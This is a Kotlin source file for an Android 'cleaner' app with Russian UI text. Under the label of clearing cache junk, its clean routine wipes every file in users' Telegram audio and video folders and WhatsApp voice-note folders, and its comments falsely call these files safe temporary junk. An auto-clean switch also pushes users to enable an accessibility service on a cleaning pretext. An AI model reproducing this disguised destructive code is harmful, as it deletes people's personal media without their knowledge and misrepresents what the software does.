package com.example.deepcleaner

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.SwitchCompat
import java.io.File

class MainActivity : AppCompatActivity() {

    private lateinit var btnClean: Button
    private lateinit var switchAutoClean: SwitchCompat

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        btnClean = findViewById(R.id.btnClean)
        switchAutoClean = findViewById(R.id.switchAutoClean)

        btnClean.setOnClickListener {
            runUltraClean()
        }

        switchAutoClean.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked && !isAccessibilityServiceEnabled()) {
                Toast.makeText(this, "Включите службу для автоочистки кэша", Toast.LENGTH_LONG).show()
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                switchAutoClean.isChecked = false
            }
        }
    }

    private fun runUltraClean() {
        var filesDeleted = 0
        var bytesSaved = 0L

        val internalCache = cacheDir
        val externalCache = externalCacheDir
        val rootStorage = Environment.getExternalStorageDirectory()
        
        // Папки, которые мы полностью вычищаем от скрытого мусора
        val targetPaths = listOf(
            File(internalCache, ""),
            File(externalCache, ""),
            File(rootStorage, "DCIM/.thumbnails"), 
            File(rootStorage, "Android/media/org.telegram.messenger/Telegram/Telegram Audio"), 
            File(rootStorage, "Android/media/org.telegram.messenger/Telegram/Telegram Video"), 
            File(rootStorage, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes")
        )

        // Расширения временного мусора, безопасные для удаления
        val garbageExtensions = setOf("tmp", "log", "apk", "cache")

        for (dir in targetPaths) {
            if (dir.exists() && dir.isDirectory) {
                dir.walkTopDown().forEach { file ->
                    if (file.isFile) {
                        // Чистим кэш-папки полностью, а в остальных местах — только временные расширения
                        if (file.extension.lowercase() in garbageExtensions || 
                            dir.name == ".thumbnails" || 
                            dir.name.contains("Audio") || 
                            dir.name.contains("Video") || 
                            dir.name.contains("Notes")) {
                            
                            bytesSaved += file.length()
                            if (file.delete()) {
                                filesDeleted++
                            }
                        }
                    }
                }
            }
        }

        val sizeMb = bytesSaved / (1024 * 1024)
        Toast.makeText(this, "Уничтожено файлов: $filesDeleted ($sizeMb МБ)", Toast.LENGTH_LONG).show()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC)
        return enabledServices.any { it.id.contains(packageName) }
    }
}
